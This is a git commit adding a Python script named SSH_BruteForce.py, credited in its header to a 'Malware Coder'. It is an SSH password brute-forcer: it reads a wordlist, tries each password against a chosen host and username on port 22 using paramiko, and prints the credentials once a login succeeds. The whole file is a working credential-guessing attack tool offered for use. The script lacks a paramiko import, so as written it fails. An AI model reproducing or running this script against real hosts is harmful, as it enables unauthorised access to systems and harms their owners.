f75a65c20fb857aa309d35a50b1ce424faeb2d5f
giannis10 <80069359+giannis10@users.noreply.github.com>
2022-12-23 23:37:46 +0200

    Add files via upload

---
+++ SSH_BruteForce.py
@@ -0,0 +1,35 @@
+##################################################
+#                                                #
+#         Malware Coder: G.T                     #
+#                                                #
+#   Github: https://github.com/giannis10         #
+#                                                #
+##################################################
+
+count = 1
+
+def connectSSH(hostname, port, username, passFile):
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    with open(passFile, "r") as f:
+        global count
+        for password in f.readlines():
+            password = password.strip()
+            try:
+                client.connect(hostname, port=port, username=username, password=password)
+                print("[" + str(count) + "] " + "[+] Password Success ~ " + password)
+                print("*" * 50)
+                print("HostName: " + hostname)
+                print("UserName: " + username)
+                print("Password: " + password)
+                print("*" * 50)
+                break
+            except:
+                print("[" + str(count) + "] " + "[-] Password Failed ~ " + password)
+                count += 1
+
+hostname = input("[*] Enter HostName: ")
+username = input("[*] Enter UserName: ")
+passwordFile = input("[*] Enter Passwords File: ")
+
+connectSSH(hostname, 22, username, passwordFile)
